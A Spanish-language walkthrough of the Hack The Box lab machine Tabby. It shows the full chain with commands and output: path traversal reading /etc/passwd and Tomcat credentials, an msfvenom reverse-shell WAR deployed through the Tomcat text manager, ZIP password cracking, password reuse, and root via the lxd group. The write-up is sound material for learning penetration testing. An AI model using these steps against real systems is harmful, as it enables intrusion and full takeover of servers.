Resumen

Tabby es una cadena completa y muy didáctica: un LFI que filtra credenciales, esas credenciales desplegando un WAR en Tomcat, reutilización de contraseñas y, al final, el grupo lxd, que es root disfrazado.

Reconocimiento

┌──(jaime㉿kali)-[~]└─$ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.194

3 puertos abiertos:

PuertoServicioVersión

Enumeración

El puerto 80 muestra la web de Mega Hosting. En la portada hay un aviso sobre una brecha de datos con un enlace:

http://megahosting.htb/news.php?file=statement

Aparece el dominio megahosting.htb, así que lo añado al archivo de hosts:

┌──(jaime㉿kali)-[~]└─$ echo "10.10.10.194 megahosting.htb" | sudo tee -a /etc/hosts

El parámetro file tiene una pinta inmejorable. Pruebo a salir del directorio:

┌──(jaime㉿kali)-[~]└─$ curl "http://megahosting.htb/news.php?file=../../../../etc/passwd"
root:x:0:0:root:/root:/bin/bash ... ash:x:1000:1000:...:/home/ash:/bin/bash

Local File Inclusion confirmado, y el usuario con UID 1000 es ash.

En el 8080 está Tomcat con su página por defecto. El panel de administración pide credenciales, y esas credenciales viven en un archivo conocido. En las instalaciones de Tomcat 9 por paquete de Ubuntu la ruta no es la de la distribución oficial:

┌──(jaime㉿kali)-[~]└─$ curl "http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml"
<role rolename="admin-gui"/> <role rolename="manager-script"/> <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>

Credenciales de Tomcat:

UsuarioContraseñaRoles
tomcat$3cureP4s5w0rd123!admin-gui, manager-script

El rol es manager-script, no manager-gui. Eso significa que no puedo entrar por el navegador, pero sí usar la interfaz de texto del gestor, en /manager/text.

Explotación

Genero un WAR con una shell inversa:

┌──(jaime㉿kali)-[~]└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.X LPORT=443 -f war -o shell.war

Y lo despliego con el comando deploy de la interfaz de texto:

┌──(jaime㉿kali)-[~]└─$ curl -u 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war "http://10.10.10.194:8080/manager/text/deploy?path=/shell"
OK - Deployed application at context path [/shell]

Con el listener preparado, visito la aplicación desplegada:

┌──(jaime㉿kali)-[~]└─$ curl http://10.10.10.194:8080/shell/
tomcat@tabby:/var/lib/tomcat9$ whoami tomcat

Movimiento lateral

Buscando por el sistema aparece un archivo fuera de sitio en la raíz del otro sitio web:

tomcat@tabby:/var/www/html/files$ ls 16162020_backup.zip

Me lo llevo a mi máquina y veo que está cifrado. Lo paso a formato de John y lo rompo:

┌──(jaime㉿kali)-[~]└─$ zip2john 16162020_backup.zip > hash.txt
┌──(jaime㉿kali)-[~]└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
admin@it (16162020_backup.zip)

La contraseña del ZIP es admin@it. El contenido del archivo no aporta gran cosa… pero la contraseña sí. Pruebo la reutilización con el usuario del sistema:

tomcat@tabby:~$ su ash Password: admin@it ash@tabby:~$ whoami ash

Escalada de privilegios

ash@tabby:~$ id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)

lxd. Pertenecer a ese grupo permite crear contenedores, y un contenedor privilegiado puede montar el sistema de archivos del anfitrión. Es root por la puerta de atrás.

Primero compruebo qué imágenes hay disponibles:

ash@tabby:~$ lxc image list

Si no hay ninguna, se construye una imagen de Alpine con lxd-alpine-builder y se sube:

ash@tabby:~$ lxc image import ./alpine.tar.gz --alias alpine ash@tabby:~$ lxc init alpine escalada -c security.privileged=true

La clave es security.privileged=true: fuerza al contenedor a interactuar como root con el sistema de archivos del anfitrión, sin el mapeo de usuarios que normalmente lo aísla.

ash@tabby:~$ lxc config device add escalada host-root disk source=/ path=/mnt/root recursive=true ash@tabby:~$ lxc start escalada ash@tabby:~$ lxc exec escalada /bin/sh
~ # whoami root ~ # cat /mnt/root/root/root.txt

Todo el disco del anfitrión está montado en /mnt/root dentro del contenedor, y lo leo como root.

Flags

ash@tabby:~$ cat /home/ash/user.txt ~ # cat /mnt/root/root/root.txt

Conclusiones

  • Un LFI no es "solo leer archivos": vale exactamente lo que valga el archivo más sensible al que llegues. Aquí, las credenciales de Tomcat.
  • Conviene conocer las rutas de configuración según la instalación. En Tomcat 9 instalado por paquete en Ubuntu, tomcat-users.xml está en /usr/share/tomcat9/etc/, no en /opt/tomcat/conf/.
  • El rol manager-script basta para desplegar un WAR aunque el panel web esté cerrado.
  • La reutilización de contraseñas sigue siendo uno de los movimientos laterales más rentables. Prueba siempre cualquier contraseña que encuentres contra todos los usuarios del sistema.
  • Los grupos lxd, docker y disk equivalen a root. Revisa siempre id nada más conseguir un usuario.
